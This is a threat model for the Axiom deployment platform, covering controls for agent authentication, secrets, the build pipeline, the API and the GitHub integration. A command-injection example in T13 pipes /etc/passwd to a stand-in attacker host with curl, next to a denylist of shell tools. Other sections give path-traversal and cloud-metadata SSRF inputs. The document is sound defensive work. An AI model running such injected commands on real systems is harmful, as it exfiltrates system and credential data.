# Axiom Security Threat Model and Abuse Controls (V0.1)

> Issue #129. This document replaces the earlier draft: every control below was
> re-verified against the code at the revision recorded in section 10, with a
> `path:line` proof. A control is listed as **EN PLACE** only when the code that
> implements it is instantiated by a composition root, not merely present in a
> package. Anything else is **ABSENT**, **NON CABLE** (implemented but never
> wired) or **PARTIEL**.
>
> This document is a release gate for #111 ("V0.1 Security & Failure
> Regression Gate"). Section 9 lists what must be closed before V0.1.

## 1. Scope, assets and trust assumptions

### 1.1 In scope

| Surface | Where |
|---|---|
| Public REST API | `services/engine/internal/api`, mounted at `/api/v1` |
| Engine outbound to GitHub | `services/engine/internal/github/**` |
| Deployment build pipeline | `services/engine/internal/build/**` |
| Engine -> Agent transport | `services/engine/internal/agentclient`, `services/agent/internal/security/transport` |
| Agent inbound listener | `services/agent/internal/bootstrap/listener.go` |
| Agent runtime adapters (Docker, Traefik) | `services/agent/internal/runtime/**` |
| Secret storage at rest | `services/engine/internal/security/secrets`, `internal/github/auth` |
| PostgreSQL persistence | `services/engine/migrations/**` |

### 1.2 Out of scope (V0.1)

Billing, Kubernetes, multi-cloud, GitLab, organization/RBAC tenancy (V0.1 is
single-user ownership, `services/engine/internal/authz/authz.go:5-8`),
autonomous operations, marketplace, remote shell.

### 1.3 Assets

| Asset | Storage | Confidentiality requirement |
|---|---|---|
| GitHub OAuth access/refresh tokens | `github_connections.access_sealed` / `refresh_sealed`, AES-256-GCM | high |
| Agent credentials | `agent_identities.credential_hash` (SHA-256 only) | high |
| Agent bootstrap token | `agent_bootstrap_tokens.token_hash` (SHA-256 only) | high |
| User password hashes | `users.password_hash`, PBKDF2-HMAC-SHA256 | high |
| Session tokens | `sessions.token_hash` (SHA-256), plaintext in the HttpOnly cookie | high |
| Application configuration values | `secrets.value_sealed`, AES-256-GCM, write-only at the API | high |
| `AXIOM_SECRET_KEY`, `AXIOM_API_TOKEN`, `DATABASE_URL` | Engine process environment | critical |
| Build workspaces | `/tmp/axiom-build/axiom-build-<random>` | medium |
| Container images | local Docker daemon, tag `axiom-local/<slug>:<sha7>-<dep8>` | medium |
| Audit trail | `audit_events`, redacted at write | medium |

### 1.4 Trust assumptions

1. **The repository is untrusted.** Its content is fetched from GitHub, extracted
   to disk and executed by the Docker daemon on the Engine host.
2. **The agent host is semi-trusted.** The Agent holds Docker and Traefik
   privileges on the machine where customer code runs. It is the enforcement
   point for container ownership; a compromised Agent means host compromise.
3. **The Engine host is trusted by Axiom.** It holds `AXIOM_SECRET_KEY` and the
   database. The threat model does not defend the Engine host against a local
   root attacker.
4. **No managed secret service.** `AXIOM_SECRET_KEY` is a single 32-byte key
   from the environment. There is no KMS, no HSM, no key rotation mechanism.
   Rotation means re-encrypting every row by hand.
5. **Single-process deployment.** The Engine is one process; horizontal scaling
   would break the in-memory replay caches in section 5.1.
6. **GitHub is a trusted identity and archive provider**, but repository content
   is not trusted (assumption 1).

## 2. Actor and attack-surface matrix

| Actor | Capabilities | Reachable surface | Authentication | Effective authorization |
|---|---|---|---|---|
| Anonymous internet | TCP to the Engine if `0.0.0.0` is exposed | `/health`, `/ready`, `/metrics`, `/api/v1/auth/register`, `/api/v1/auth/login`, `/api/v1/github/callback` | none on the first three; self-service on register/login | none (registration is open) |
| Authenticated user (low privilege) | session cookie or bearer | all `/api/v1` routes for owned resources | `SessionAuthenticator` | `authz.Resolver` + 404-hiding |
| Machine client | `AXIOM_API_TOKEN` | all `/api/v1` routes | constant-time SHA-256 compare | maps to the single `usr_local` principal, i.e. full owner rights |
| Rogue agent | network reach to the Engine | `/api/v1/agent/register`, `/rotate`, `/heartbeat` | bootstrap token, then credential + nonce + timestamp | bound to one server |
| Compromised Engine | holds `AXIOM_SECRET_KEY` | everything | n/a | full |
| Malicious repository | content only | build pipeline, analyzer, compose parser | n/a | denylist on commands, compose policy |
| Compromised Agent host | root-equivalent | everything on the host | n/a | none needed |

### 2.1 Network exposure

| Endpoint | Bind | TLS | Authentication |
|---|---|---|---|
| Engine HTTP | `0.0.0.0:8080` by default (`config.go:17-18`, `:95`) | none in-process; TLS is expected from a front proxy (ADR-0005) | middleware chain |
| Engine `/health`, `/ready`, `/metrics` | same, **outside** the auth chain (`httpserver/server.go:50-76` vs `api.go:205`) | idem | **NONE** |
| Agent operation listener | `127.0.0.1:9401` by default (`services/agent/internal/config/config.go:35`) | **none, no implementation exists** (#88) | `refuseInbound`, rejects everything |
| Agent -> Engine | https required in production (`config.go:184-193`, `transport.go:79-86`) | yes in production | bearer + nonce + timestamp |

## 3. Threats: Engine/Agent boundary

### T1. Spoofing — rogue agent registration

**Scenario.** An attacker who observes or guesses a pending bootstrap token
calls `POST /api/v1/agent/register` with his own `serverId`, binds an agent
identity to the victim's server, and then receives a long-lived credential
(90 days) that lets him forge heartbeats for that server.

**Controls.**
- Bootstrap token is single-use, bound to a server, TTL 15 min:
  `services/engine/internal/agentauth/service.go:24`, `:188-211`,
  `:227` (`ConsumeBootstrapToken`), `:231-233` (`ErrServerMismatch`).
- Token stored only as a SHA-256 hash: `service.go:207` (`hashToken`), `:508-511`.
- The endpoint bypasses the user authenticator
  (`services/engine/internal/api/agent.go:17-19`, `:23-32`) and authenticates in
  the handler from the bearer token (`agent.go:74-78`, `:101`).
- Issuance requires the caller to own the server
  (`services/engine/internal/api/agent.go:45-53`).

**State: EN PLACE**, except that tokens are issued over a channel that has no
TLS of its own (T8).

### T2. Spoofing — forged or replayed agent requests

**Scenario.** An attacker captures one heartbeat (credential in the
`Authorization` header) and replays it to keep a dead server reported READY, or
to skew resource metrics.

**Controls.**
- Credential + `X-Nonce` + `X-Timestamp`, freshness checked before the body is
  read: `api/agent_heartbeat.go:47-52`, `agentauth/service.go:344-353`,
  `:433-448`.
- Nonce single-use in a 10-minute in-memory window:
  `agentauth/service.go:32`, `:473-498`.
- Clock skew bounded to 5 minutes: `agentauth/service.go:30`, `:441`.
- Heartbeat payload identity must match the authenticated identity:
  `api/agent_heartbeat.go:84-86`.
- Revocation checked on every use (identity status **and** server status):
  `agentauth/service.go:451-463`.

**State: EN PLACE.** Residual: the nonce cache is per-process and in memory
(`service.go:473-482`), so a restart or a second Engine replica accepts replays
inside the window. Low severity given the 5-minute skew bound.

### T3. Repudiation — credential theft

**Scenario.** An attacker with read access to PostgreSQL recovers agent
credentials and impersonates agents.

**Controls.**
- Only hashes are persisted: `agentauth/service.go:270`, `:310`, `:508-511`.
- Plaintext is returned exactly once at issue/redeem
  (`api/agent.go:193-203`) and never logged: `api/agent.go:241-252` logs action,
  agentId and reason only.
- Rotation with a 5-minute grace: `agentauth/service.go:28`, `:321-326`.

**State: EN PLACE.** Residual: SHA-256 without a work factor on a
256-bit random token is acceptable (the token is not guessable and not
password-derived).

### T4. Tampering — forged operations sent to an Agent

**Scenario.** An attacker reaches the Agent's operation listener and posts a
`CREATE_RUNTIME`/`REMOVE` operation to take over or delete containers.

**Controls.**
- The listener authenticates **before** reading the body and before dispatching:
  `services/agent/internal/bootstrap/listener.go:112-119`.
- The only authenticator injected by the composition root rejects every request:
  `bootstrap.go:212` (`refuseInbound`), `listener.go:47-52`.
- Envelope, closed operation set, operation ID, deployment ID, mandatory
  application ID and server-identity binding are validated again in the
  dispatcher: `listener.go:133-136`, `protocol.go:211-235`,
  `dispatcher.go:315`.
- Strict decoding, unknown field = malformed: `listener.go:147-157`.
- Body bound: `listener.go:20-21` (64 KiB), `:121-125`.

**State: EN PLACE (fail-closed), and the reverse direction is equally blocked.**

### T5. Tampering — an Agent that accepts work it should not

**Scenario.** Once the Engine->Agent credential direction exists, a replayed or
stale operation from a compromised Engine makes an Agent create a container for
the wrong application.

**Controls.**
- Deterministic operation IDs and terminal-state replay rejection in the durable
  state store: `bootstrap.go:255-278` (returns `CodeReplayed`).
- Server-identity binding: `protocol.go:230-233`.
- Application scope mandatory, never defaulted: `protocol.go:224-229`.

**State: EN PLACE for the Agent side. The Engine does not currently send a
compliant message — see E3 in section 9.**

### T6. Spoofing — container belonging to another application

**Scenario.** Operation A of deployment D1 asks the Agent to `START`,
`STOP` or `REMOVE` a container created by deployment D2. If ownership is only
checked as "is this container Axiom-managed at all", D1 can destroy D2.

**Controls.**
- Canonical label set stamped at create:
  `services/agent/internal/runtime/docker/docker.go:589-602`,
  `services/agent/internal/security/ownership/*.go` (`NewLabels`,
  `IsManaged`, `AssertContainer`).
- `Start`, `Stop`, `Remove` all gate on `verifyManaged`:
  `docker.go:368`, `:376`, `:385`, defined at `:553-562` (managed-only, see the
  state note below).
- Traefik routing enforces the full application+deployment scope through a live
  Docker inspect: `services/agent/internal/bootstrap/bootstrap.go:165-172`,
  `services/agent/internal/runtime/traefik/traefik.go:265-274`.
- Canonical labels cannot be overridden by the caller:
  `docker.go:591-597`.

**State: PARTIEL — see G3.** `ownership.assertScope` is now the strict
check: `axiom.managed=true`, plus `axiom.application` and `axiom.deployment`
both equal to the operation scope
(`services/agent/internal/security/ownership/ownership.go:139-150`), and the
scope reaches the adapters through `runtimeBridge.scope()`
(`services/agent/internal/bootstrap/bridge.go:84-86`) and
`dispatcher.go:162`. CREATE_RUNTIME and NETWORK enforce it
(`bridge.go:89-117`, `traefik.go:265-274`). **START, STOP and REMOVE do not**:
they call `Adapter.verifyManaged`
(`services/agent/internal/runtime/docker/docker.go:368`, `:376`, `:385`),
which still tests only `ownership.IsManaged` (`docker.go:553-562`) and never
compares a label to the operation scope. A STOP or REMOVE for deployment D1
therefore accepts a container belonging to D2 on the same server.

### T7. Information disclosure — cross-tenant reads

**Scenario.** User B calls `GET /api/v1/servers` or
`GET /api/v1/servers/{id}` and enumerates user A's servers, their addresses,
agent versions and health.

**Controls.**
- Applications: `ownedApplication` returns 404 for a foreign record:
  `api/handlers.go:78-96`.
- Deployments: ownership resolved through the parent application:
  `api/handlers.go:409-429`, `:435-444`.
- SSE stream: `api/api.go:194` + `api/handlers.go:447-454`.
- Application configuration: `api/appconfig.go:43-52`.
- GitHub connections: scoped by `principal.UserID` at every call site,
  e.g. `api/github.go:82`.
- Audit trail: filtered by `OwnerID` at the query, `api/audit.go:27-31`.
- Servers: writes check ownership (`api/handlers.go:221-225`, `:252-256`).

**State: ABSENT for the server read paths — see E5 in section 9.**
`listServers` (`api/handlers.go:136-160`) calls
`Servers.ListFiltered(ctx, status, limit, offset)` with no owner predicate, and
the SQL has none: `internal/database/repositories.go:236-241` selects on status
only. `getServer` (`:174-181`) and `serverHealth` (`:265-273`) go through
`loadServer` (`:162-172`), which performs **no** authorization at all.

## 4. Threats: secrets

### T8. Information disclosure — secrets at rest

**Scenario.** An attacker reads PostgreSQL or a backup and recovers GitHub
tokens, which grant repository access on the user's behalf.

**Controls.**
- AES-256-GCM with a per-value random nonce:
  `internal/security/secrets/box.go:50-59`.
- Ciphertext bound to its owner as AAD, so ciphertexts cannot be swapped between
  records: `secrets/store.go:37` (`scope/name`) and
  `internal/github/auth/service.go:179`, `:185` (`github-access:<id>`).
- `AXIOM_SECRET_KEY` required in production and whenever GitHub is configured:
  `internal/config/config.go:169-171`, `:182-184`; the key itself is never
  logged (no logging statement in `config.go`).
- Application configuration values are write-only at the API layer: metadata
  only, `internal/secrets/appconfig.go:60-70`, `api/appconfig.go:21-35`.

**State: EN PLACE.** Residual: one static key, no rotation path, and the
`secrets` table is readable by anyone with a SQL connection.

### T9. Information disclosure — secrets in logs and diagnostics

**Scenario.** A build or runtime log line contains a token; an attacker reads
the deployment logs through the API.

**Controls.**
- Redaction before persistence: `internal/logs/store.go:65`,
  `internal/logs/redact.go:28-35` (PEM blocks, URL credentials, bearer tokens,
  JSON and key=value secrets).
- Redaction of every audit field at write: `internal/audit/audit.go:107-125`.
- Redaction of the whole structured-log sink:
  `internal/observability/logging/redact.go:26-97`.
- Access log records method, path and status only, never headers, query strings
  or bodies: `api/middleware.go:61-71`.
- Agent-side redaction mirrors the Engine:
  `services/agent/internal/logs/logs.go:282-291`.
- 5xx responses never carry internal detail: `api/http.go:31-36`,
  `api/errors.go:107-109`.
- Panic recovery returns a stable envelope: `api/middleware.go:74-87`.

**State: EN PLACE.** Residual: `logs.Redact` is pattern-based. A secret in an
unrecognized format (an AWS key without its `AWS_SECRET_ACCESS_KEY=` prefix, a
JWT) is not redacted.

### T10. Information disclosure — secrets into the build environment

**Scenario.** A malicious repository's `RUN` step reads `DATABASE_URL` or
`AXIOM_SECRET_KEY` from the build process environment and exfiltrates it. This
was exploitable until the fix below landed: `if b.Env != nil` left `cmd.Env`
nil, and a nil `exec.Cmd.Env` inherits the whole Engine process environment.

**Controls.**
- The workspace itself contains no control-plane credential:
  `internal/build/workspace/workspace.go:1-6` (package doc), `:62-82` (0700,
  random name).
- The container environment is explicitly caller-approved only, never augmented
  from the host: `services/agent/internal/runtime/docker/docker.go:201-205`.
- Secret-like repository files are never retained by the analyzer:
  `internal/analyzer/snapshot/snapshot.go:168`, `:216-217`.
- The `docker build` child gets an explicit minimal environment, never the
  Engine's: `cmd.Env = childEnv(os.Environ(), b.Env)` is unconditional
  (`services/engine/internal/build/builder.go:156-158`). `childEnv`
  (`builder.go:88-117`) copies only the `buildEnvNames` allowlist
  (`builder.go:55-72`) from the parent and layers caller-requested
  `ExecBuilder.Env` on top with override on key collision.

**State: EN PLACE — corrected since the audit draft (was ABSENT for the Engine
build process; the divergence recorded as E1 is resolved).** Until the fix, the
child environment was only overridden when `ExecBuilder.Env` was non-nil, and
`bootstrap.go:250` leaves it nil, so `docker build` ran with `DATABASE_URL`,
`AXIOM_SECRET_KEY`, `AXIOM_API_TOKEN` and `AXIOM_GITHUB_CLIENT_SECRET` in its
process environment — exactly what the scenario above describes. `childEnv` now
keeps only `buildEnvNames` (`builder.go:55-72`: PATH, HOME, TMPDIR, locale,
`DOCKER_*`, HTTP(S)/`NO_PROXY`, GOPROXY/GOPRIVATE/GOSUMDB) from the parent,
adds caller-requested `ExecBuilder.Env` on top with override on key collision,
and falls back to `defaultPATH` (`builder.go:52-53`) when neither provides one.
Non-regression tests: `TestExecBuilderNilEnvDoesNotInheritEngineEnvironment`,
`TestExecBuilderExplicitEnvIsCallerRequestedOnly` and `TestChildEnv`
(`services/engine/internal/build/builder_test.go:120`, `:142`, `:174`).

## 5. Threats: build pipeline

### T11. Tampering — arbitrary code execution via repository Dockerfile

**Scenario.** A user connects a hostile repository whose `Dockerfile` contains
`RUN --mount=type=bind,from=...` or simply exfiltrates the source over the
network during `docker build`. The Dockerfile is executed by the Docker daemon
running as root on the Engine host.

**Controls.**
- A repository Dockerfile is used as-is when the strategy is `dockerfile`:
  `internal/build/engine.go:228-236`. There is **no** inspection, sandboxing or
  rewriting of its instructions.
- No network restriction is passed to the builder: the argument list is
  `build --iidfile <tmp> -f <df> -t <tag> --label ... <ctx>`,
  `internal/build/builder.go:74-81`. No `--network=none`.
- No resource limits and no `--security-opt` are passed:
  `builder.go:74-81`.
- The command line is built from argv only, never through a shell:
  `builder.go:83`.
- The build is time-bounded (10 minutes by default): `builder.go:59-63`.

**State: PARTIEL — accepted for V0.1 with a compensating control.** Archive
extraction is hardened (T12), and the build timeout bounds resource abuse, but
**code execution inside the builder is unrestricted by design**. This is the
single largest residual risk in the product and is listed as blocking in section 9.

### T12. Tampering — archive path traversal and symlink escape

**Scenario.** A tarball contains `../../etc/cron.d/x` or a symlink to
`/var/lib/axiom-agent/credential.json` to read the Agent's credential through
the build context.

**Controls.**
- Absolute paths, `..` segments, backslashes and NUL bytes rejected:
  `internal/build/workspace/workspace.go:201-212`.
- Symlinks, hardlinks and device nodes are skipped, never followed:
  `workspace.go:149-152`.
- Duplicate paths refused by `O_EXCL`: `workspace.go:175`.
- Size limits (200 MiB compressed, 1 GiB total, 50 000 files, 100 MiB per file):
  `workspace.go:41-46`, enforced at `:107`, `:159-169`.
- Compose build context cannot escape the workspace:
  `internal/build/compose.go:119-133`.

**State: EN PLACE.**

### T13. Tampering — command injection through build/start commands

**Scenario.** A repository ships `axiom.yaml` with
`build.command: "npm run build; curl http://attacker/$(cat /etc/passwd)"`, which
is interpolated into `RUN ...` in a generated Dockerfile.

**Controls.**
- `axiom.yaml` commands pass through `presets.ValidateCommand` before becoming
  hints: `internal/manifest/hints.go:24-29`.
- `ValidateCommand`: single line of printable ASCII, 500 chars max, denylist on
  backtick, `$(`, `<<`, `sudo `, `rm -rf /`, `curl `, `wget `:
  `internal/profile/presets/presets.go:197-213`.
- The plan validator re-checks both commands:
  `internal/planner/validation/validation.go:97-103`.
- Quote escaping on `CMD`: `internal/build/dockerfile.go:88-90`,
  `internal/runtime/presets/node/dockerfile.go:162-164`.
- Compose build path uses the repository Dockerfile rather than a generated one:
  `internal/build/compose.go:62-80`.

**State: PARTIEL.** The denylist is bypassable — `;`, `|`, `&`, `>`, `\n` via
`$()`, `${IFS}`, `eval`, `python -c`, or simply `apt-get install` are not
blocked, and `presets.ValidateCommand` is a blocklist rather than an allowlist.
The mitigation that actually holds is T11's residual risk being inherent to
building user code at all; the blocklist only removes the *noisy* vectors.

### T14. Tampering — Compose privilege escalation

**Scenario.** A repository's `compose.yaml` requests `privileged: true`,
`network_mode: host`, or bind-mounts `/var/run/docker.sock`.

**Controls.**
- Blocking rules with stable codes: `internal/runtime/presets/compose/validate.go:126-174`
  (`COMPOSE_PRIVILEGED`, `COMPOSE_NETWORK_MODE_HOST`, `COMPOSE_PID_HOST`,
  `COMPOSE_IPC_HOST`, `COMPOSE_HOST_MOUNT_SENSITIVE`,
  `COMPOSE_PRIVILEGED_PORT`), sensitive-path list at `:71-96`.
- Any blocking issue aborts the build:
  `internal/build/compose.go:44-47`.
- The plain (non-Compose) path cannot request privileges at all: the Agent's
  `docker create` argument list is fixed
  (`services/agent/internal/runtime/docker/docker.go:325-342`).

**State: EN PLACE.**

### T15. Supply chain — unpinned base images

**Scenario.** `node:20-alpine` or `golang:1.23-alpine` is re-published upstream
with a malicious layer; every Axiom build inherits it.

**Controls.** None. Base images are floating tags:
`internal/runtime/presets/node/node.go:34-35`,
`internal/build/dockerfile.go:51`. Generated Dockerfiles carry no digest pin.

**State: ABSENT.** Recorded as an accepted V0.1 risk; no external registry trust
policy exists.

### T16. Supply chain — dependency scanning

**Scenario.** A vulnerable transitive Go or npm dependency ships a CVE.

**Controls.** None. The CI (`.github/workflows/go.yml:33-49`) runs `gofmt`,
`go vet`, `go test -race` and an end-to-end job; there is no `govulncheck`, no
`npm audit`, no OSV or Trivy step, and no image scan. `apps/cloud` has a
lockfile (`apps/cloud/package-lock.json`) but no audit gate, and the
`@axiom/cloud` build is not part of any workflow.

**State: ABSENT.**

## 6. Threats: API surface

### T17. Spoofing — unauthenticated API access

**Scenario.** An attacker probes `/api/v1/applications` without credentials.

**Controls.**
- Every route except the three public ones sits behind the authenticate
  middleware: `api/api.go:204-209`, `api/middleware.go:186-203`.
- Fail-closed when no authenticator is configured: `api/api.go:121-123`,
  `middleware.go:146-149` (`denyAll`).
- Session token comparison is constant-time; the static token is hashed and
  compared with `subtle.ConstantTimeCompare`:
  `api/auth_session.go:50-55`.
- Session and machine token validated against the store:
  `api/auth_session.go:59-63`, `:73-77`.

**State: EN PLACE.** Residual: in development without `AXIOM_API_TOKEN`, every
request is authenticated as the local operator: `bootstrap.go:152-154`,
`api/middleware.go:140-144`.

### T18. Tampering — CSRF on cookie sessions

**Scenario.** A malicious page makes the victim's browser `DELETE
/api/v1/servers/{id}` using the session cookie.

**Controls.**
- Double-submit token required on mutating cookie-authenticated requests:
  `api/middleware.go:175-184`, enforced at `:198-201`.
- Cookie is `HttpOnly`, `SameSite=Lax`, `Secure` in production:
  `api/auth_session.go:282-291` (`Secure: a.secure`, defaulted to production at
  `internal/config/config.go:110`).
- Bearer clients are exempt because they do not rely on ambient cookies:
  `api/middleware.go:176`.

**State: EN PLACE.**

### T19. Information disclosure — credential stuffing

**Scenario.** An attacker scripts `POST /api/v1/auth/login` against known
emails.

**Controls.**
- Passwords hashed with PBKDF2-HMAC-SHA256, 200 000 iterations, per-user
  128-bit salt, constant-time verification:
  `internal/auth/password.go:24-29`, `:33-45`, `:49-68`.
- Generic error on bad credentials: `api/auth_session.go:135-137`.
- Length and complexity floors: `api/auth_session.go:110-113`.

**State: PARTIEL — no rate limiting and no lockout. See T20.** The code itself
labels PBKDF2 as an interim decision below current guidance
(`internal/auth/password.go:15-23`).

### T20. Denial of service — API flooding

**Scenario.** An attacker floods `/api/v1/auth/login`, `/api/v1/applications` or
the agent endpoints to exhaust CPU, PostgreSQL connections or memory.

**Controls.**
- Request body capped at 1 MiB: `api/http.go:17`, `:58`.
- Pagination bounded to 100 items: `api/http.go:88-110`.
- GitHub upstream rate limits normalized to 429: `api/errors.go:91-92`.
- Agent endpoints require a valid credential per request: `api/agent.go:17-19`.
- Body and header timeouts on both servers: `bootstrap.go:110-112`,
  `services/agent/internal/bootstrap/bootstrap.go:215-219`.

**State: ABSENT for general API rate limiting.** There is no rate-limit
middleware in `services/engine/internal/api` (grep for `rate` returns only
pagination and the GitHub error mapping). A `RateLimiter` exists in
`services/agent/internal/security/transport/transport.go:117-159` but **no
caller instantiates it** (grep for `NewRateLimiter` outside tests returns
nothing) — NON CABLE. `POST /api/v1/auth/register` is public and unauthenticated,
so account creation is also unbounded.

### T21. Information disclosure — secret leakage in error responses

**Scenario.** A 500 response body reveals a SQL fragment containing a
connection string.

**Controls.**
- Unknown errors collapse to `INTERNAL_ERROR` with a fixed message:
  `api/errors.go:107-109`.
- Server-side detail is logged redacted, never returned: `api/http.go:31-36`.
- Panic path returns a stable envelope: `api/middleware.go:81-83`.

**State: EN PLACE.**

### T22. Tampering — idempotency key replay across actors

**Scenario.** User B reuses user A's `Idempotency-Key` to obtain user A's
deployment record.

**Controls.**
- Key namespaced per actor, operation and application:
  `internal/deployment/store.go:73-76`.
- Unique constraint plus request-hash mismatch -> 409:
  `internal/database/deployment/store.go:84-113`,
  `api/errors.go:77-78`.
- Key length bounded at 255: `api/handlers.go:294-297`.

**State: EN PLACE.**

### T23. Spoofing — SSRF through repository URLs

**Scenario.** A user supplies a repository URL pointing at
`http://169.254.169.254/` to read cloud instance metadata or an internal
service.

**Controls.**
- No arbitrary URL is ever fetched. The archive is built from
  `s.APIURL + <owner>/<repo>/tarball/<sha40>`, with the SHA shape validated:
  `internal/github/repos/repos.go:271-283`.
- `APIURL` comes from configuration, not from the request:
  `internal/config/config.go:117`.
- No agent-computable health path outside the deployed application: the probe
  URL is `http://<domain><path>`, with the domain shape-validated
  (`internal/planner/validation/validation.go:107-109`) and the path required to
  start with `/` (`:112-114`).

**State: EN PLACE.** Residual: the archive HTTP client has no global timeout
and streams unbounded (`repos.go:288`), relying on the context and the
workspace extraction limits.

### T24. Information disclosure — hostnames claimed by another application

**Scenario.** User A registers `victim.example.com` and intercepts the traffic
of user B's application deployed on the same hostname.

**Controls.**
- `hostname` is globally unique: `migrations/003_v01_core_schema.sql:164`.
- Hostname shape constrained by a CHECK including lowercase:
  `003_v01_core_schema.sql:160`, relaxed to single labels by
  `migrations/007_domain_single_label.sql:5-7`.
- `EnsureDomain` refuses an unregistered hostname when the environment already
  has one: `internal/domains/domains.go:179-194`.
- DNS verification compares resolution against the server address:
  `internal/domains/verify.go:35-64`.

**State: EN PLACE.** Residual: the CHECK permits single-label hostnames
(`localhost`, and any bare label), which is a hostname-squatting surface on
intranet deployments.

## 7. Threats: Agent runtime

### T25. Tampering — Traefik configuration injection

**Scenario.** A crafted domain or container name injects YAML into Traefik's
file provider and hijacks routing for another tenant.

**Controls.**
- Domain validated as a bare lowercase hostname, no scheme/port/whitespace:
  `services/agent/internal/runtime/traefik/traefik.go:78-114`, applied at `:178`.
- Container name must match the Axiom naming rules: :266-267.
- Deployment ID must match `dep_[0-9a-f]{24}`: `:71`, `:175`.
- Only `axiom-<deploymentID>.yml` is ever written, read or removed:
  `:324-327`, `:329-340`.
- Atomic write (temp file, fsync, chmod, rename): `:330-363`.
- Ownership asserted against a live Docker inspect before any routing change:
  `services/agent/internal/bootstrap/bootstrap.go:165-172`.
- Reconcile never touches a file whose name is not a valid deployment ID:
  `traefik.go:242-258`.

**State: EN PLACE.** Residual: the ACME resolver is fixed to `le` and the
static entrypoints are operator-managed (documented at `:25-27`), which is the
correct ownership split.

### T26. Denial of service — container port exhaustion

**Scenario.** A user deploys many applications, each claiming a host port, until
the host runs out.

**Controls.**
- The host port is ephemeral and bound to loopback only:
  `services/agent/internal/runtime/docker/docker.go:320` (`-p 127.0.0.1::<port>`).
  A conflict is therefore impossible between Axiom containers.
- Compose host ports below 1024 are rejected:
  `internal/runtime/presets/compose/validate.go:162-166`.
- Port range validated at the protocol, adapter and plan layers:
  `protocol.go:254-...`, `docker.go:228-230`,
  `internal/planner/validation/validation.go:104-106`.

**State: EN PLACE** (detection plus prevention by design).

### T27. Information disclosure — container isolation is Docker-default only

**Scenario.** An escaped or vulnerable application container reaches other
containers, the host network or the Docker socket.

**Controls.**
- No privileged mode, no host namespaces: the create argument list is fixed
  (`docker.go:325-342`).
- Resource limits accepted and applied when set: `docker.go:329-334`.
- Compose policy blocks the equivalent host-namespace escapes:
  `internal/runtime/presets/compose/validate.go:136-151`.
- Containers are labelled and mutation-gated: `docker.go:549-562`.

**State: PARTIEL.** No seccomp profile, no AppArmor profile, no capability
dropping (`--cap-drop`), no read-only rootfs and no `no-new-privileges` are
requested. Docker defaults apply. Listed as accepted V0.1 risk.

### T28. Denial of service — orphan containers and unbounded reconciliation

**Scenario.** The Engine restarts mid-operation; containers are left behind and
never reconciled.

**Controls.**
- Durable operation state written on receipt and on completion:
  `services/agent/internal/bootstrap/bootstrap.go:255-290`.
- Local classification of interrupted work at boot: :177-181.
- A reconciler exists and is reachable: `:181-188`, with `AllowCleanup: false`
  so it can never remove anything.

**State: NON CABLE.** `Reconcile` is never called at boot:
`services/agent/internal/bootstrap/bootstrap.go:189-196` (the managed-deployment
set is not exposed by any endpoint). It is also not called anywhere else in the
module (grep for `Reconcile` outside tests returns only the definition and its
comments). A restart therefore leaves orphans permanently.

### T29. Information disclosure — the Agent has no TLS

**Scenario.** An attacker on the network path between Engine and Agent reads
the Agent credential in transit.

**Controls.**
- The Agent refuses every inbound operation regardless of transport, so nothing
  sensitive is served today: `listener.go:47-52`, `:112-119`.
- The listener binds loopback by default and refuses any routable address
  without an explicit opt-in: `services/agent/internal/config/config.go:198-222`.
- The Agent's own outbound policy requires https in production:
  `config.go:184-193`, `services/agent/internal/security/transport/transport.go:71-91`.
- The Engine requires https for agent endpoints in production and allows http
  only on loopback otherwise:
  `services/engine/internal/agentclient/client.go:542-557`.

**State: ABSENT for TLS itself (tracked by #88).** The fail-closed stance makes
it non-exploitable today; it becomes exploitable the moment T4's authenticator is
implemented. See section 9.

## 8. Threats: GitHub integration

### T30. Spoofing — OAuth login CSRF and state replay

**Scenario.** An attacker starts an OAuth flow, then lures the victim to the
callback URL carrying the attacker's `code`, binding the attacker's GitHub
account to the victim's Axiom session.

**Controls.**
- Browser secret cookie bound to the callback, `HttpOnly`, `SameSite=Lax`,
  10-minute `MaxAge`: `api/github.go:44-47`, verified at `:59-62`.
- State is single-use, 10-minute TTL, bound to the user:
  `internal/github/auth/service.go:115`, `:156`.
- PKCE S256 with the verifier sealed under a state-derived AAD:
  `service.go:115`, `:156`.
- Provider `error` parameter handled, `access_denied` mapped to a denied result:
  `api/github.go:62-70`.
- The callback never renders tokens and sets `Referrer-Policy: no-referrer`:
  `api/github.go:72-75`.

**State: EN PLACE.**

### T31. Spoofing — webhook spoofing

**Scenario.** A GitHub webhook is introduced; an attacker POSTs a forged
`push` event to trigger a deployment of a chosen commit.

**Controls.** None applicable. **There are no webhooks.** A repository-wide grep
for `webhook` across `services/`, `schemas/` and the API contract returns 0
occurrences. GitHub interaction is strictly user-initiated OAuth plus REST
polling on demand (`api/api.go:137-142`).

**State: ABSENT by design.** Recorded here because the moment webhooks land they
must be signature-verified (`X-Hub-Signature-256`) and the delivery must be
replay-bounded; otherwise the platform gains an unauthenticated write path into
the deployment pipeline.

## 9. Threats without an effective control — V0.1 gate list

| # | Threat | State | Why it is not mitigated |
|---|---|---|---|
| G1 | **Unrestricted code execution in the build step** (T11) | PARTIEL | The repository Dockerfile is executed by a root Docker daemon with full network access and no resource or security limits (`internal/build/engine.go:228-236`, `internal/build/builder.go:74-81`). No rootless builder, no `--network=none`, no BuildKit sandbox, no instruction filtering. |
| G2 | **Engine secrets inherited by the build process** (T10) | EN PLACE | Closed (E1). `cmd.Env = childEnv(os.Environ(), b.Env)` is now unconditional (`services/engine/internal/build/builder.go:156-158`); `childEnv` (`:88-117`) keeps only the `buildEnvNames` allowlist (`:55-72`) plus caller-requested `ExecBuilder.Env` and a `defaultPATH` fallback (`:52-53`), so `docker build` can no longer see `AXIOM_SECRET_KEY`, `DATABASE_URL`, `AXIOM_API_TOKEN` or `AXIOM_GITHUB_CLIENT_SECRET`, whether `bootstrap.go:250` leaves `Env` nil or not. Regression tests `builder_test.go:120`, `:142`, `:174`. |
| G3 | **Cross-deployment container operations** (T6) | PARTIEL | `ownership.assertScope` (`ownership.go:139-150`) is strict, but START, STOP and REMOVE go through `docker.go:553-562`, which checks only `IsManaged` and never compares a label to the operation scope. A STOP or REMOVE for deployment D1 accepts a container belonging to D2. CREATE_RUNTIME and NETWORK do enforce the full scope. |
| G4 | **Cross-tenant server enumeration** (T7) | ABSENT | `api/handlers.go:136-160`, `:162-181`, `:265-273` have no owner predicate; `internal/database/repositories.go:236-241` selects on status only. |
